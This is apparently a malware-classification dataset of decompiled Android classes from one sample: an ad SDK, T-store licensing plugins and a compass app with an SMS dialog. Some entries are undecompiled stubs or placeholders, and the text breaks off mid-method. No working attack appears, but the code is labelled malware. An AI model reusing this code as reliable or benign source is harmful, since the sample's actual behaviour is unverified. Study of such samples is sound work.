"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\v.code","class v implements com.feiwo.i.b.d {   final com.feiwo.f.a.h f260a;   final TableplaqueAdInfo f261b;   final u c;   public v(  u uVar,  com.feiwo.f.a.h hVar,  TableplaqueAdInfo tableplaqueAdInfo){     this.c=uVar;     this.f260a=hVar;     this.f261b=tableplaqueAdInfo;   }   @Override public void a(  Drawable drawable,  String str){     if (this.c.f259b.n() == null) {       return;     }     this.c.f258a.a(this.f260a,this.f261b,drawable);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\w.code","class w extends TypeToken<List<TableplaqueAdInfo>> {   final InterstitialBusinssDirector f262a;   public w(  InterstitialBusinssDirector interstitialBusinssDirector){     this.f262a=interstitialBusinssDirector;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\x.code","class x extends TypeToken<RootNode<TableplaqueAdInfo>> {   final InterstitialBusinssDirector f263a;   public x(  InterstitialBusinssDirector interstitialBusinssDirector){     this.f263a=interstitialBusinssDirector;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\y.code","public class y implements Runnable {   final InterstitialView f264a;   public y(  InterstitialView interstitialView){     this.f264a=interstitialView;   }   @Override public void run(){     InterstitialBusinssDirector interstitialBusinssDirector;     InterstitialView interstitialView=this.f264a;     interstitialBusinssDirector=this.f264a.j;     interstitialView.a(interstitialBusinssDirector.e(1));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\z.code","public class z implements View.OnClickListener {   final InterstitialView f265a;   public z(  InterstitialView interstitialView){     this.f265a=interstitialView;   }   @Override public void onClick(  View view){     TableplaqueAdInfo i;     TableplaqueAdInfo i2;     InterstitialBusinssDirector interstitialBusinssDirector;     TableplaqueAdInfo i3;     i=this.f265a.i();     if (i != null) {       Context context=this.f265a.getContext();       i2=this.f265a.i();       if (com.feiwo.i.u.a(context,i2).getFullscreenDown().isOn()) {         interstitialBusinssDirector=this.f265a.j;         i3=this.f265a.i();         interstitialBusinssDirector.b(i3);       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view.a\a.code","public interface a {   void a(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view.a\b.code","public interface b {   void a(  h hVar);   void a(  h hVar,  TableplaqueAdInfo tableplaqueAdInfo,  Drawable drawable);   void a(  TableplaqueAdInfo tableplaqueAdInfo);   void b(  h hVar); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.lgt.arm\a.code","public class a implements ArmInterface {   private IBinder f266a;   public a(  IBinder iBinder){     this.f266a=iBinder;   }   public String a(){     return ""com.lgt.arm.ArmInterface"";   }   @Override public IBinder asBinder(){     return this.f266a;   }   @Override public int executeArm(  String str){     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.lgt.arm.ArmInterface"");       obtain.writeString(str);       this.f266a.transact(1,obtain,obtain2,0);       obtain2.readException();       return obtain2.readInt();     }   finally {       obtain2.recycle();       obtain.recycle();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.lgt.arm\ArmInterface.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4a302d6e"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.lgt.arm\Stub.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6d13a663"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.skt.arm\a.code","public class a extends TimerTask {   final ArmManager f271a;   public a(  ArmManager armManager){     this.f271a=armManager;   }   @Override public void run(){     Process.killProcess(Process.myPid());   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.skt.arm\ArmListener.code","public interface ArmListener {   public static final int f267a=1;   public static final int f268b=20;   public static final int c=3;   void a(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.skt.arm\ArmManager.code","public class ArmManager {   private static final String ARM_SERVICE_PACKAGE=""com.skt.skaf.OA00018282"";   private static final String TAG=""ARMPlugin"";   protected static ArmListener f269a;   private static Context f270b;   private static b c;   private static IArmService d;   private String LIB_FILE_PATH;   public int nNetState;   public String nResAID;   public int nResCode;   public String sAID;   public String sMaskAID;   public String sResMsg;   public ArmManager(  Context context){     Log.d(TAG,String.valueOf(toString()) + "" ArmManager Create"");     f270b=context;     this.LIB_FILE_PATH=""/data/data/"" + f270b.getPackageName() + ""/lib/libARMPlugin.so"";   }   private native String ARMPluginGetMaskString();   private native String ARMPluginMakeChallenge(  String str);   private native int ARMPluginProcessResponse(  int i);   public int a(  int i){     return ARMPluginProcessResponse(i);   }   public String c(  String str){     Log.d(TAG,String.valueOf(toString()) + "" GetMakeChallenge"");     this.nResCode=-1;     if (!e(this.LIB_FILE_PATH)) {       return """";     }     Log.d(TAG,String.valueOf(toString()) + "" - Load JNI LIBRARY"");     System.load(this.LIB_FILE_PATH);     return ARMPluginMakeChallenge(str);   }   public int d(  String str){     try {       return d.executeArm(str);     }  catch (    Exception e) {       e.printStackTrace();       return -1;     }   }   public void d(){     f269a.a();     a();   }   private boolean e(){     try {       f270b.getPackageManager().getApplicationInfo(ARM_SERVICE_PACKAGE,0);       Log.d(TAG,String.valueOf(toString()) + "" T store ARM is found"");       return true;     }  catch (    PackageManager.NameNotFoundException e) {       Log.d(TAG,String.valueOf(toString()) + "" T store ARM is not found"");       return false;     }   }   private boolean e(  String str){     return new File(str).exists();   }   private void f(){     Toast.makeText(f270b,this.sResMsg,1).show();     new Timer().schedule(new a(this),2000L,3000L);   }   public void a(){     Log.d(TAG,String.valueOf(toString()) + "" ARMPlugin DisconnectService"");     if (c != null) {       c=null;     }   }   public void a(  ArmListener armListener){     f269a=armListener;   }   public void a(  String str){     if (b(str)) {       this.nNetState=1;     }  else {       this.nNetState=20;       d();     }   }   public boolean b(  String str){     Log.d(TAG,String.valueOf(toString()) + "" ARMPlugin ConnectService"");     this.sResMsg=""T storeê°€ ì œëŒ€ë¡œ ì„¤ì¹˜ë�˜ì–´ ìžˆì§€ ì•ŠìŠµë‹ˆë‹¤. T storeë¥¼ ì‚­ì œ í›„ ìž¬ì„¤ì¹˜ í•˜ì‹  ë‹¤ì�Œ ì–´í”Œë¦¬ì¼€ì�´ì…˜ì�„ ìž¬ì‹¤í–‰ í•´ì£¼ì‹œê¸° ë°”ëž�ë‹ˆë‹¤.(20)"";     try {       if (c == null) {         c=new b(this,null);       }       if (c == null) {         return false;       }       if (str.length() != 10) {         f();         return false;       }       this.sAID=str;       if (e()) {         return f270b.bindService(new Intent(IArmService.class.getName()),c,1);       }       return false;     }  catch (    Exception e) {       e.printStackTrace();       return false;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.skt.arm\b.code","public class b implements ServiceConnection {   final ArmManager f273a;   private b(  ArmManager armManager){     this.f273a=armManager;   }   public b(  ArmManager armManager,  b bVar){     this(armManager);   }   @Override public void onServiceConnected(  ComponentName componentName,  IBinder iBinder){     int i=-1;     Log.d(""ARMPlugin"",String.valueOf(toString()) + "" onServiceConnected"");     ArmManager.a(IArmService.Stub.asInterface(iBinder));     String a2=ArmManager.a(this.f273a,this.f273a.sAID);     if (a2 != """") {       int a3=ArmManager.a(this.f273a,ArmManager.b(this.f273a,a2));       if (a3 != 1) {         ((Activity)ArmManager.b()).moveTaskToBack(true);         i=a3;       }  else {         i=a3;       }     }     if (i == 1) {       this.f273a.nNetState=1;     }  else {       this.f273a.nNetState=20;     }     ArmManager.b().unbindService(ArmManager.c());     ArmManager.a(this.f273a);   }   @Override public void onServiceDisconnected(  ComponentName componentName){     ArmManager.a(this.f273a);     Log.d(""ARMPlugin"",String.valueOf(toString()) + "" onServiceDisconnected"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.skt.arm.aidl\a.code","public class a implements IArmService {   private IBinder f272a;   public a(  IBinder iBinder){     this.f272a=iBinder;   }   public String a(){     return ""com.skt.arm.aidl.IArmService"";   }   @Override public IBinder asBinder(){     return this.f272a;   }   @Override public int executeArm(  String str){     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.skt.arm.aidl.IArmService"");       obtain.writeString(str);       this.f272a.transact(1,obtain,obtain2,0);       obtain2.readException();       return obtain2.readInt();     }   finally {       obtain2.recycle();       obtain.recycle();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.skt.arm.aidl\IArmService.code","!org.eclipse.jdt.core.dom.TypeDeclaration@53a6828b"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.skt.arm.aidl\Stub.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6e99a1d2"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\a.code","class a implements View.OnClickListener {   final DialogSMS f284a;   public a(  DialogSMS dialogSMS){     this.f284a=dialogSMS;   }   @Override public void onClick(  View view){     this.f284a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\b.code","class b implements TextWatcher {   final DialogSMS f285a;   public b(  DialogSMS dialogSMS){     this.f285a=dialogSMS;   }   @Override public void afterTextChanged(  Editable editable){   }   @Override public void beforeTextChanged(  CharSequence charSequence,  int i,  int i2,  int i3){   }   @Override public void onTextChanged(  CharSequence charSequence,  int i,  int i2,  int i3){     this.f285a.b();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\c.code","class c implements CompoundButton.OnCheckedChangeListener {   final DialogSMS f286a;   public c(  DialogSMS dialogSMS){     this.f286a=dialogSMS;   }   @Override public void onCheckedChanged(  CompoundButton compoundButton,  boolean z){     this.f286a.f275b=Boolean.valueOf(z);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\d.code","class d {   final int f287a;   final int f288b;   float[] c;   int d;   int e;   boolean f;   boolean g;   float h;   float i;   float j;   float k;   float l;   float m;   Path n;   final MetalView o;   private d(  MetalView metalView){     this.o=metalView;     this.f287a=300;     this.f288b=200;     this.c=new float[300];     this.d=0;     this.e=0;     this.f=true;     this.g=false;   }   public d(  MetalView metalView,  d dVar){     this(metalView);   }   public Path a(){     int i=0;     if (this.f) {       this.h=MetalView.a(this.o).getWidth() * 0.9f;       this.i=MetalView.a(this.o).getHeight();       this.j=MetalView.b(this.o) - (this.h / 1.97f);       this.k=MetalView.c(this.o);       this.l=this.h / 300.0f;       this.m=this.i / 200.0f;       this.f=false;     }     this.n=new Path();     this.n.moveTo(this.j,this.k);     while (true) {       if (i >= (this.g ? 300 : this.d)) {         return this.n;       }       if (i == 0 && this.g) {         this.e=this.d + 1;       }       int i2=this.e + i;       if (i2 > this.c.length - 1) {         i2-=300;       }       if (i == 0) {         this.n.moveTo(this.j - this.l,this.k - (this.m * this.c[i2]));       }       this.n.lineTo(this.j + (this.l * i),this.k - (this.c[i2] * this.m));       i++;     }   }   public void a(  float f){     this.d++;     if (this.d > this.c.length - 1) {       this.d=0;       this.g=true;     }     this.c[this.d]=Math.min(f,200.0f);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\DialogSMS.code","public class DialogSMS extends Activity implements View.OnClickListener {   private SharedPreferences f274a;   private Boolean f275b;   private String c;   private EditText d;   private EditText e;   private TextView f;   private int a(){     String editable=this.e.getText().toString();     if (editable == null) {       return 0;     }     try {       return editable.getBytes(""EUC-KR"").length;     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();       return editable.length();     }   }   private void a(  String str){     Toast.makeText(this,str,1).show();     ((Vibrator)getSystemService(""vibrator"")).vibrate(150L);   }   public void b(){     this.f.setText(String.valueOf(a()) + "" / 80  "");   }   @Override public void onClick(  View view){     String string;     String editable=this.d.getText().toString();     String editable2=this.e.getText().toString();     if (editable.length() <= 0) {       a(getString(C0000R.string.sms_no_input));       return;     }     String string2=getString(C0000R.string.sms_success);     try {       SmsManager.getDefault().sendTextMessage(editable,null,editable2,null,null);       string=string2;     }  catch (    NullPointerException e) {       string=getString(C0000R.string.sms_fail);       e.printStackTrace();     }     Toast.makeText(this,string,1).show();     SharedPreferences.Editor edit=this.f274a.edit();     edit.putBoolean(""sms_save"",this.f275b.booleanValue());     if (this.f275b.booleanValue()) {       edit.putString(""sms_phone"",editable);     }  else {       edit.putString(""sms_phone"","""");     }     edit.commit();     finish();   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     setContentView(C0000R.layout.dialog_sms);     this.d=(EditText)findViewById(C0000R.id.phone);     this.e=(EditText)findViewById(C0000R.id.message);     this.f=(TextView)findViewById(C0000R.id.sms_byte);     CheckBox checkBox=(CheckBox)findViewById(C0000R.id.phone_save);     this.e.setText(getIntent().getStringExtra(""SmartCompass""));     this.f274a=PreferenceManager.getDefaultSharedPreferences(this);     this.f275b=Boolean.valueOf(this.f274a.getBoolean(""sms_save"",true));     if (this.f275b.booleanValue()) {       this.c=this.f274a.getString(""sms_phone"","""");       this.d.setText(this.c);       this.e.requestFocus();     }  else {       checkBox.setChecked(false);     }     ((Button)findViewById(C0000R.id.button)).setOnClickListener(this);     ((Button)findViewById(C0000R.id.button1)).setOnClickListener(new a(this));     this.e.addTextChangedListener(new b(this));     checkBox.setOnCheckedChangeListener(new c(this));   }   @Override protected void onResume(){     super.onResume();     b();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\e.code","class e implements SensorEventListener {   h[] g;   final SmartCompass j;   float[] f289a=new float[9];   float[] f290b=new float[9];   float[] c=new float[9];   float[] d=new float[3];   float[] e=new float[3];   boolean f=false;   float[] h=new float[3];   int i=0;   public e(  SmartCompass smartCompass){     this.j=smartCompass;     this.g=new h[]{new h(smartCompass,null),new h(smartCompass,null),new h(smartCompass,null)};   }   @Override public void onAccuracyChanged(  Sensor sensor,  int i){   }   @Override public void onSensorChanged(  android.hardware.SensorEvent r12){     throw new UnsupportedOperationException(""Method not decompiled: kr.aboy.compass.e.onSensorChanged(android.hardware.SensorEvent):void"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\f.code","class f implements DialogInterface.OnClickListener {   final SmartCompass f291a;   public f(  SmartCompass smartCompass){     this.f291a=smartCompass;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.f291a.d();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\FinderView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5b7f03ce"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\g.code","class g implements DialogInterface.OnClickListener {   final SmartCompass f292a;   public g(  SmartCompass smartCompass){     this.f292a=smartCompass;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\h.code","class h {   final int f293a;   float[] f294b;   int c;   final SmartCompass d;   private h(  SmartCompass smartCompass){     this.d=smartCompass;     this.f293a=10;     this.f294b=new float[10];     this.c=0;   }   public h(  SmartCompass smartCompass,  h hVar){     this(smartCompass);   }   public float a(  float r9){     throw new UnsupportedOperationException(""Method not decompiled: kr.aboy.compass.h.a(float):float"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\MetalView.code","public final class MetalView extends View {   private int A;   private boolean B;   private String C;   private float D;   private float E;   private float F;   private float G;   private int H;   private int I;   private int J;   private int K;   private final float L;   private float M;   private float N;   private final int O;   private final int P;   private final int Q;   private final int R;   private final Paint f278a;   private final Rect f279b;   private Path c;   private Path d;   private RectF e;   private Context f;   private final int g;   private final int h;   private final int i;   private int j;   private int k;   private int l;   private int m;   private Bitmap n;   private Bitmap o;   private Bitmap[] p;   private Bitmap q;   private Bitmap r;   private d s;   private Bitmap t;   private boolean u;   private boolean v;   private float w;   private final float x;   private int y;   private int z;   public MetalView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.j=0;     this.k=0;     this.l=0;     this.m=0;     this.p=new Bitmap[10];     this.s=new d(this,null);     this.u=false;     this.v=false;     this.w=1.0f;     this.x=1.7f;     this.B=true;     this.C="""";     this.L=getContext().getResources().getDisplayMetrics().densityDpi / 25.4f;     this.M=4.0f * this.L;     this.O=49;     this.P=29;     this.Q=89;     this.R=169;     this.f278a=new Paint(1);     this.c=new Path();     this.d=new Path();     this.f279b=new Rect();     this.e=new RectF();     this.f=context;     Resources resources=getResources();     this.g=resources.getColor(C0000R.color.finder_frame);     this.h=resources.getColor(C0000R.color.white_color);     this.i=resources.getColor(C0000R.color.finder_mask1);     this.n=BitmapFactory.decodeResource(getResources(),C0000R.drawable.chart_mag);     this.o=BitmapFactory.decodeResource(getResources(),C0000R.drawable.unit1);     this.t=BitmapFactory.decodeResource(getResources(),C0000R.drawable.vibrate);     this.q=BitmapFactory.decodeResource(getResources(),C0000R.drawable.sound_on);     this.r=BitmapFactory.decodeResource(getResources(),C0000R.drawable.sound_off);     this.p[0]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_0);     this.p[1]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_1);     this.p[2]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_2);     this.p[3]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_3);     this.p[4]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_4);     this.p[5]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_5);     this.p[6]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_6);     this.p[7]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_7);     this.p[8]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_8);     this.p[9]=BitmapFactory.decodeResource(getResources(),C0000R.drawable.num_9);     setFocusable(true);   }   private int a(  int i){     if (SmartCompass.q == -1 && !this.v) {       SmartCompass.a(i);     }     if (i < 39) {       return i <= 29 ? -1442791169 : -1436090369;     }     if (i <= 69) {       return -1442775296;     }     if (SmartCompass.q > 0 && i >= SmartCompass.q && !this.v) {       SmartCompass.a(0);       this.u=true;     }     if (i < 89) {       return -1426096171;     }     if (i > 169 && !this.v) {       ((Vibrator)this.f.getSystemService(""vibrator"")).vibrate(20L);       this.u=true;     }     return -1426128896;   }   public void a(  int i,  int i2,  int i3,  int i4){     this.j=i;     this.k=i2;     this.l=i3;     this.m=i4;   }   @Override public void onDraw(  Canvas canvas){     Path a2;     if (this.B) {       this.y=canvas.getWidth();       this.z=canvas.getHeight();       this.D=this.y / 2;       this.E=this.z / 2;       if (this.y > this.z) {         this.w=1.7f;         this.M*=1.7f;         this.E-=this.M;       }       this.N=(this.M * 3.0f) / 2.0f;       this.d.moveTo(this.y - this.M,((this.z - (this.M * 3.0f)) + (this.N / 2.0f)) - this.n.getHeight());       this.d.lineTo(this.M + (this.N / 2.0f),((this.z - (this.M * 3.0f)) + (this.N / 2.0f)) - this.n.getHeight());       this.e.set((int)this.M,((int)((this.z - (this.M * 3.0f)) - (this.N / 2.0f))) - this.n.getHeight(),(int)(this.M + this.N),((int)((this.z - (this.M * 3.0f)) + (this.N / 2.0f))) - this.n.getHeight());       this.d.addArc(this.e,90.0f,180.0f);       this.d.lineTo(this.y - this.M,((int)((this.z - (this.M * 3.0f)) - (this.N / 2.0f))) - this.n.getHeight());       this.d.lineTo(this.y - this.M,((this.z - (this.M * 3.0f)) + (this.N / 2.0f)) - this.n.getHeight());       this.C=""< "" + this.f.getString(C0000R.string.menu_metal) + "" >"";       this.B=false;     }     this.f278a.setTextSize(4.5f * this.L * this.w);     this.f278a.setColor(this.h);     canvas.drawText(this.C,this.D - (this.f278a.measureText(this.C) / 2.0f),6.8f * this.L * this.w,this.f278a);     this.K=this.j / b.a.a.f.f12b;     if (this.j > 9999) {       this.H=9;       this.I=9;       this.J=9;       this.K=9;     }  else {       this.J=(this.j - (this.K * b.a.a.f.f12b)) / 100;       this.I=((this.j - (this.K * b.a.a.f.f12b)) - (this.J * 100)) / 10;       this.H=((this.j - (this.K * b.a.a.f.f12b)) - (this.J * 100)) % 10;     }     if (this.j < 100) {       this.G=this.p[this.I].getWidth() * 2;       canvas.drawBitmap(this.p[this.I],this.D - (this.G / 2.0f),this.E - this.p[this.I].getHeight(),(Paint)null);       canvas.drawBitmap(this.p[this.H],(this.D - (this.G / 2.0f)) + this.p[this.I].getWidth(),this.E - this.p[this.I].getHeight(),(Paint)null);       canvas.drawBitmap(this.o,(this.D - (this.G / 2.0f)) + this.p[this.I].getWidth() + this.p[this.H].getWidth(),this.E - this.o.getHeight(),(Paint)null);     }  else     if (this.j < 1000) {       this.G=this.p[this.I].getWidth();       canvas.drawBitmap(this.p[this.J],(this.D - (this.G / 2.0f)) - this.p[this.J].getWidth(),this.E - this.p[this.J].getHeight(),(Paint)null);       canvas.drawBitmap(this.p[this.I],this.D - (this.G / 2.0f),this.E - this.p[this.J].getHeight(),(Paint)null);       canvas.drawBitmap(this.p[this.H],this.D + (this.G / 2.0f),this.E - this.p[this.J].getHeight(),(Paint)null);       canvas.drawBitmap(this.o,this.D + (this.G / 2.0f) + this.p[this.H].getWidth(),this.E - this.o.getHeight(),(Paint)null);     }  else     if (this.j >= 1000) {       this.G=this.p[this.J].getWidth() + this.p[this.I].getWidth();       canvas.drawBitmap(this.p[this.K],((this.D - (this.G / 2.0f)) - this.p[this.K].getWidth()) - this.o.getWidth(),this.E - this.p[this.K].getHeight(),(Paint)null);       canvas.drawBitmap(this.p[this.J],(this.D - (this.G / 2.0f)) - (this.o.getWidth() / 2),this.E - this.p[this.K].getHeight(),(Paint)null);       canvas.drawBitmap(this.p[this.I],((this.D - (this.G / 2.0f)) + this.p[this.J].getWidth()) - (this.o.getWidth() / 2),this.E - this.p[this.K].getHeight(),(Paint)null);       canvas.drawBitmap(this.p[this.H],(this.D + (this.G / 2.0f)) - (this.o.getWidth() / 2),this.E - this.p[this.K].getHeight(),(Paint)null);       canvas.drawBitmap(this.o,((this.D + (this.G / 2.0f)) + this.p[this.H].getWidth()) - (this.o.getWidth() / 2),this.E - this.o.getHeight(),(Paint)null);     }     this.A=a(this.j);     this.f278a.setColor(this.g);     this.f278a.setStyle(Paint.Style.STROKE);     this.f278a.setStrokeWidth(2.0f);     canvas.drawPath(this.d,this.f278a);     this.f278a.setStrokeWidth(1.0f);     this.f278a.setStyle(Paint.Style.FILL);     this.F=this.M + (((this.y - (this.M * 2.0f)) * Math.min(this.j,200)) / 200.0f);     this.c=new Path();     this.c.moveTo(this.F,((this.z - (this.M * 3.0f)) + (this.N / 2.0f)) - this.n.getHeight());     this.c.lineTo(this.M + (this.N / 2.0f),(this.z - (((this.M * 3.0f) * this.N) / 2.0f)) - this.n.getHeight());     this.e.set((int)this.M,((int)((this.z - (this.M * 3.0f)) - (this.N / 2.0f))) - this.n.getHeight(),(int)(this.M + this.N),((int)((this.z - (this.M * 3.0f)) + (this.N / 2.0f))) - this.n.getHeight());     this.c.addArc(this.e,90.0f,180.0f);     this.c.lineTo(this.F,((int)((this.z - (this.M * 3.0f)) - (this.N / 2.0f))) - this.n.getHeight());     this.c.lineTo(this.F,((this.z - (this.M * 3.0f)) + (this.N / 2.0f)) - this.n.getHeight());     this.f278a.setColor(this.A);     canvas.drawPath(this.c,this.f278a);     this.f278a.setColor(this.g);     this.f278a.setTextSize(2.3f * this.L * this.w);     if (this.j < 170) {       canvas.drawText(""200Î¼T"",(this.y - this.M) - this.f278a.measureText(""200Î¼T""),(((this.z - (this.M * 3.0f)) - (this.N / 2.0f)) - 10.0f) - this.n.getHeight(),this.f278a);     }     this.f278a.setColor(this.h);     canvas.drawText(new StringBuilder().append(this.j).toString(),this.F - (this.f278a.measureText(new StringBuilder().append(this.j).toString()) / 2.0f),(((this.z - (this.M * 3.0f)) - (this.N / 2.0f)) - 10.0f) - this.n.getHeight(),this.f278a);     if (this.u && !this.v) {       canvas.drawBitmap(this.t,this.y - this.t.getWidth(),((this.z - this.t.getHeight()) - (2.8f * this.M)) - this.n.getHeight(),this.f278a);     }     canvas.drawBitmap(SmartCompass.q != 0 ? this.q : this.r,(this.y - (this.q.getWidth() / 2)) - this.M,((this.z - this.q.getHeight()) - (1.8f * this.M)) - this.n.getHeight(),this.f278a);     this.f278a.setColor(this.g);     this.f278a.setTextSize(2.6f * this.L * this.w);     canvas.drawText(this.f.getString(C0000R.string.magnetic_field),this.M,(this.E - this.p[this.H].getHeight()) - (5.0f * this.L),this.f278a);     canvas.drawText(""x="" + this.k + "",  y=""+ this.l+ "",  z=""+ this.m,(this.y - this.f278a.measureText(""x="" + this.k + "", y=""+ this.l+ "", z=""+ this.m)) / 2.0f,((this.z - (this.M * 2.0f)) + (this.N / 2.0f)) - this.n.getHeight(),this.f278a);     this.f278a.setColor(this.i);     this.f279b.set(0,this.z - this.n.getHeight(),this.y,this.z);     canvas.drawRect(this.f279b,this.f278a);     canvas.drawBitmap(this.n,this.D - (this.n.getWidth() / 2),this.z - this.n.getHeight(),(Paint)null);     this.f278a.setColor(this.A);     this.f278a.setStyle(Paint.Style.STROKE);     this.s.a(this.j);     this.f278a.setStrokeWidth(3.0f);     a2=this.s.a();     canvas.drawPath(a2,this.f278a);     this.f278a.setStrokeWidth(1.0f);     this.f278a.setStyle(Paint.Style.FILL);   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     int x=(int)motionEvent.getX();     int y=(int)motionEvent.getY();     if (this.u && !this.v && x >= this.y - this.t.getWidth() && y >= ((this.z - this.t.getHeight()) - (this.M * 2.8f)) - this.n.getHeight() && y <= (this.z - this.t.getHeight()) - (this.M * 2.8f)) {       this.v=true;     }     return true;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\PrefActivity.code","public class PrefActivity extends PreferenceActivity {   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     addPreferencesFromResource(C0000R.xml.settings_compass);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\Preview.code","public final class Preview extends SurfaceView implements SurfaceHolder.Callback {   private SurfaceHolder f280a;   private Camera f281b;   private Context c;   private PowerManager.WakeLock d;   private PowerManager e;   private FinderView f;   private int g;   private int h;   public Preview(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.c=context;     this.f280a=getHolder();     this.f280a.addCallback(this);     this.f280a.setType(3);   }   private Camera.Size a(  int i,  int i2,  Camera.Parameters parameters){     double d=i / i2;     try {       Iterator<Camera.Size> it=parameters.getSupportedPreviewSizes().iterator();       while (it.hasNext()) {         Camera.Size next=it.next();         if (Math.abs((next.width / next.height) - d) < 0.1d && (next.width != i || next.height != i2)) {           if (next.width < (i * 3) / 2 && next.height < (i2 * 3) / 2 && (next.width > i / 2 || next.height > i2 / 2)) {             return next;           }         }       }     }  catch (    NullPointerException e) {       e.printStackTrace();     }     return null;   }   private Camera.Size b(  int i,  int i2,  Camera.Parameters parameters){     try {       Camera.Size size=null;       for (      Camera.Size size2 : parameters.getSupportedPreviewSizes()) {         if (size2.width <= i && size2.height <= i2) {           if (size == null) {             size=size2;           }  else {             if (((i - size2.width) + i2) - size2.height < ((i - size.width) + i2) - size.height) {               size=size2;             }           }         }       }       if (size == null) {         return null;       }       if (size.width > i / 2.2f || size.height > i2 / 2.2f) {         return size;       }       return null;     }  catch (    NullPointerException e) {       e.printStackTrace();       return null;     }   }   void a(){     this.f.a(this.f281b);   }   public void a(  FinderView finderView){     this.f=finderView;   }   @Override public void surfaceChanged(  SurfaceHolder surfaceHolder,  int i,  int i2,  int i3){     try {       if (this.f281b != null) {         Camera.Parameters parameters=this.f281b.getParameters();         Camera.Size a2=a(i2,i3,parameters);         if (a2 